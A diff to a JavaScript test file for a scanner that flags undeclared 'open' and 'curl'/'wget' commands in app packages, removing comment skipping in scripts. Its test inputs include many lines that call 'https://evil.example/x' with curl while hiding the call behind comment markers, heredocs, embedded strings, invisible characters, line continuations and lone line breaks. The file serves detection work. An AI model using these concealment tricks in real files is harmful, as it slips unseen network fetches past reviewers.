@@ -52,9 +52,12 @@ test('lint (gallery app) and verify (its pack) both warn and exit 0', () => {
 });
 
 const f = (name, text) => [{ name, text }];
-test('scan: comments and description text do not trigger open or curl, a real command still does', () => {
-	assert.deepEqual(scanMentions(f('a.sh', '# open /var/log in your editor\n# curl https://x.example.com/y\n')), []);
-	assert.deepEqual(scanMentions(f('a.py', '  # open "/tmp/x" to see it\n')), []);
+const OPEN = 'open (starts other programs or documents) (in ';
+const CURL = 'curl or wget to evil.example, which it does not declare (in ';
+test('scan: one-line description text does not trigger open or curl, a real command still does', () => {
+	// known remaining false positive: a comment line in a script or a YAML # comment is still scanned (a line filter cannot skip it safely)
+	assert.deepEqual(scanMentions(f('a.sh', '# open /var/log in your editor\n')), [`${OPEN}a.sh)`]);
+	assert.deepEqual(scanMentions(f('a.py', '  # open "/tmp/x" to see it\n')), [`${OPEN}a.py)`]);
 	assert.deepEqual(scanMentions(f('app.yaml', 'description: "Wraps curl so you can fetch pages"\n')), []);
 	assert.deepEqual(scanMentions(f('app.yaml', 'description: "open /var/log in your editor"\n')), []);
 	assert.deepEqual(scanMentions(f('app.yaml', 'placeholder_examples: ["curl it"]\ndescription: Wraps wget\n')), []);
@@ -66,8 +69,6 @@ test('scan: comments and description text do not trigger open or curl, a real co
 });
 
 // Hiding a command inside something that looks like prose or a comment must not work.
-const OPEN = 'open (starts other programs or documents) (in ';
-const CURL = 'curl or wget to evil.example, which it does not declare (in ';
 test('scan: a description line inside a block scalar or multi-line quote does not hide a command', () => {
 	assert.deepEqual(scanMentions(f('app.yaml', 'run: |\n  description: x; open /Applications/Foo.app\n')), [`${OPEN}app.yaml)`]);
 	assert.deepEqual(scanMentions(f('app.yaml', 'run: |\n  description: ; curl https://evil.example/x\n')), [`${CURL}app.yaml)`]);
@@ -76,18 +77,24 @@ test('scan: a description line inside a block scalar or multi-line quote does no
 	assert.deepEqual(scanMentions(f('app.yaml', 'description: "unclosed\n  ; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
 	assert.deepEqual(scanMentions(f('app.yaml', '  description: "indented, so not the top-level key; open /tmp/x"\n')), [`${OPEN}app.yaml)`]);
 });
-test('scan: // is a path prefix in a shell script, not a comment; a comment needs a space after the marker', () => {
-	assert.deepEqual(scanMentions(f('a.sh', '//usr/bin/curl https://evil.example/x\n')), [`${CURL}a.sh)`]);
-	assert.deepEqual(scanMentions(f('a.sh', '#curl https://evil.example/x\n')), [`${CURL}a.sh)`]);
-	assert.deepEqual(scanMentions(f('a.sh', '// open /var/log in your editor\n')), []);
+test('scan: no comment skipping in scripts: a command after a comment marker, in a string, heredoc or continuation, is still found', () => {
+	const hit = (n, t) => assert.deepEqual(scanMentions(f(n, t)), [`${CURL}${n})`], t);
+	hit('a.sh', '//usr/bin/curl https://evil.example/x\n');
+	hit('a.sh', '#curl https://evil.example/x\n');
+	hit('a.sh', '// x; curl https://evil.example/x\n');
+	hit('a.sh', 'sh <<EOF\n// x; curl https://evil.example/x\nEOF\n');
+	hit('a.py', 'import os\nos.system("""\n# x; curl https://evil.example/x\n""")\n');
+	hit('a.js', 'execSync(`\n// x; curl https://evil.example/x\n`)\n');
+	hit('a.sh', '\u00a0# x; curl https://evil.example/x\n');
+	hit('a.sh', '\ufeff# x; curl https://evil.example/x\n');
+	hit('a.sh', 'echo a\\\n# x; curl https://evil.example/z\n');
 });
-test('scan: a lone CR or U+2028 ends a comment line in Python and JS, so what follows is still scanned', () => {
+test('scan: a lone CR or U+2028 ends a line in Python and JS, so what follows is still scanned', () => {
 	assert.deepEqual(scanMentions(f('a.py', '# c\rimport os;os.system("curl https://evil.example/x")\n')), [`${CURL}a.py)`]);
 	assert.deepEqual(scanMentions(f('a.js', '// c\rexec("curl https://evil.example/x")\n')), [`${CURL}a.js)`]);
 	assert.deepEqual(scanMentions(f('a.js', '// c\u2028exec("curl https://evil.example/x")\n')), [`${CURL}a.js)`]);
 });
-test('scan: CRLF files keep working, prose still skipped and commands still found', () => {
-	assert.deepEqual(scanMentions(f('a.sh', '# open /var/log in your editor\r\n# curl https://x.example.com/y\r\n')), []);
+test('scan: CRLF app file keeps skipping one-line description text and still finds commands', () => {
 	assert.deepEqual(scanMentions(f('app.yaml', 'description: "Wraps curl so you can fetch pages"\r\nid: x\r\n')), []);
 	assert.deepEqual(scanMentions(f('a.sh', '# note\r\ncurl https://evil.example/x\r\n')), [`${CURL}a.sh)`]);
 });
